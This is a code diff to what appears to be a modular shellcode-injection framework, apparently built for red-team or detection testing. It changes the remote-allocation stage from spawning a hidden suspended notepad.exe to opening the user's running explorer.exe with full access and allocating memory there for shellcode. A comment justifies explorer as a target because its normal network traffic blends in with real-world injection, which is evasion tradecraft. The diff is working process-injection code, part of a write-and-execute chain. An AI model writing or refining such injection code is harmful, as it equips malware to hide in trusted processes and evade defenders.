@@ -3,37 +3,46 @@
 #include "../../core/utils.h"
 #include "../context.h"
 
-// T2.3 — Remote allocation
+// T2.3 — Remote allocation into existing explorer.exe
 //
-// Spawns a target process suspended (notepad.exe by default) and allocates
-// memory inside it for the shellcode. The target_process and target_thread
-// handles are stored in the context for L4 (write) and L5 (execute) to
-// consume. Must be paired with T4.3 (write_remote) and T5.4 (exec_remote_thread).
+// Finds the running explorer.exe process (always present on a logged-in
+// Windows session, owned by the same user as the payload), opens a
+// handle to it, and allocates memory inside its address space for the
+// shellcode. Stores the target_process handle in the context for L4
+// (write_remote) and L5 (exec_remote_thread) to consume.
+//
+// Pairing: T2.3 + T4.3 + T5.4 (the remote chain shares target_process).
+//
+// Choice of explorer.exe over a freshly-spawned process is deliberate:
+// explorer is always present on an interactive session, communicates
+// over the network in normal operation (OneDrive, search, Store, etc.),
+// and matches the target most commonly observed in real-world injection.
 inline BOOL Stage2_Alloc_Remote(TechniqueContext* ctx)
 {
     if (!ctx) return FALSE;
 
-    STARTUPINFOA si       = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
-
-    // CREATE_NO_WINDOW keeps notepad invisible during the test.
-    if (!CreateProcessA(
-            "C:\\Windows\\System32\\notepad.exe",
-            NULL, NULL, NULL, FALSE,
-            CREATE_SUSPENDED | CREATE_NO_WINDOW,
-            NULL, NULL, &si, &pi))
-    {
+    DWORD pid = GetProcessIdByName(L"explorer.exe");
+    if (pid == 0) {
 #ifdef DEBUG_MODE
-        DEBUG_MSG("Stage 2", "CreateProcess failed: %lu", GetLastError());
+        DEBUG_MSG("Stage 2", "explorer.exe not running; cannot inject");
 #endif
         return FALSE;
     }
 
-    ctx->target_process = pi.hProcess;
-    ctx->target_thread  = pi.hThread;
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+#ifdef DEBUG_MODE
+        DEBUG_MSG("Stage 2", "OpenProcess(explorer pid=%lu) failed: %lu",
+                  pid, GetLastError());
+#endif
+        return FALSE;
+    }
+
+    ctx->target_process = hProcess;
+    ctx->target_thread  = NULL;  // find-and-inject has no suspended thread
 
     ctx->allocated_mem = (unsigned char*)MyVirtualAllocEx(
-                            pi.hProcess,
+                            hProcess,
                             NULL,
                             ctx->length,
                             MEM_COMMIT | MEM_RESERVE,
@@ -42,10 +51,10 @@ inline BOOL Stage2_Alloc_Remote(TechniqueContext* ctx)
 
 #ifdef DEBUG_MODE
     if (ctx->allocated_mem) {
-        DEBUG_MSG("Stage 2", "Remote alloc %llu bytes at %p in pid %lu",
-                  ctx->length, ctx->allocated_mem, pi.dwProcessId);
+        DEBUG_MSG("Stage 2", "Remote alloc %llu bytes at %p in explorer pid %lu",
+                  ctx->length, ctx->allocated_mem, pid);
     } else {
-        DEBUG_MSG("Stage 2", "Remote alloc failed in pid %lu", pi.dwProcessId);
+        DEBUG_MSG("Stage 2", "Remote alloc failed in explorer pid %lu", pid);
     }
 #endif
 
